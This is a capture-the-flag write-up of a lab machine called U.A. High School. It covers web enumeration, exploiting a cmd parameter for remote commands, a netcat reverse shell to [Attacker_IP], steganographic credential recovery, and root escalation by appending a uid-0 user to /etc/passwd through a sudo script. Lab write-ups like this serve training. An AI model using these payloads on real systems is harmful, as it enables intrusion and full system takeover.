## THM CTF - U.A. High School

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   school.thm
```
Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 school.thm -p-
sudo nmap -sS -T4 school.thm -p22,80 -sV
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Let's navigate to the http server while enumerating it with ```GoBuster```.
There is one possibile entry point in the ```contact us``` form.
Nothing interesting emerges from ```GoBuster``` and ```whatweb``` enumeration.
```
gobuster dir -u http://school.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html
```
We can enumerate the form post request:
```
{
	"name": "test1",
	"email": "test1@test1.com",
	"subject": "test1",
	"message": "test1"
}
```
We tried to enumerate the only remaining folder in the website.
```
assets
```
```
gobuster dir -u http://school.thm/assets -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html
```
We are able to discover one more folder and a page.
```
/images
/index.php
```
We can try to ```FUZZ``` the ```index.php``` in the attempt to discover something useful.
```
ffuf -u 'http://school.thm/assets/index.php?FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fs 0
```
We are able to discover ```cmd``` as a possibile entry point.
Let's navigate to:
```
http://school.thm/assets/index.php?cmd=id
```
We obtain a string and ```CyberChef``` tells us that is ```base64``` encoded.
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Let's speed up the process using ```curl``` and ```base64```
```
curl --silent http://school.thm/assets/index.php?cmd=whoami | base64 -d
```
```
curl --silent "http://school.thm/assets/index.php" -G --data-urlencode "cmd=ls /home/deku" | base64 -d
```
We've located the file we need but we cannot read its content.
We can try to obtain a ```reverse shell``` with the help of [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-openbsd).
After some tries, we are able to find that the only reverse shell working is this one:
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Attacker_IP] 9001 >/tmp/f
```
```
nc -nlvp 9001
```
```
curl --silent "http://school.thm/assets/index.php" -G --data-urlencode "cmd=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Attacker_IP] 9001 >/tmp/f"
```
However we have no permission to access ```user.txt```.

Enumerating folders which we have access to, we find in 
```
/var/www/Hidden_Content/
```
a txt file contains a possibile password encoded in ```base64```.
```
AllmightForEver!!!
```
We continue to enumerate folders we have access to.

We find an image that cannot be opened in the browser.
```
wget 'http://school.thm/assets/images/oneforall.jpg'
```
We can try ```Steghide``` and the password just found
```
steghide --extract -sf oneforall.jpg 
```
but the file is not supported, however analysing it with ```head``` command, we are able to discover that is a ```PNG``` file, ```steghide``` do not support ```PNG``` file.

We can try to change its nature using ```hexeditor```.
```
hexeditor onforall.jpg
```
We try to change PNG magic bytes:
```
89 50 4E 47 0D 0A 1A 0A
```
to JPG:
```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```
Now we are able to use steghide and extract the hidden file containg the credentials we need to access to the target machine via SSH.
```
creds.txt
```
Using
```
sudo -l
```
we obtain the information about which command ```deck``` can execute as root.
```
(ALL) /opt/NewComponent/feedback.sh
```
Let's investigate.
Reading the script, it blocks some characters while reading our input, but it seems not preventing some data manipulation.

We can create a new root user by adding it to the ```/etc/passwd``` file.

Let's create an encrypted password.
```
mkpasswd -m md5crypt -s
password
$1$sxPcFYo3$kAw1X2U0lC6hgtrb4n2EC0
```

Then execute the script and insert the feedback:
```
hacked:$1$sxPcFYo3$kAw1X2U0lC6hgtrb4n2EC0:0:0:hacked:/root:/bin/bash
```
So this new user has the same permissions as root.
```
sudo ./feedback.sh
'hacked:$1$sxPcFYo3$kAw1X2U0lC6hgtrb4n2EC0:0:0:hacked:/root:/bin/bash' >> /etc/passwd
```
```
su hacked
password
```
Navigating to the root folder we are able to find the second flag.
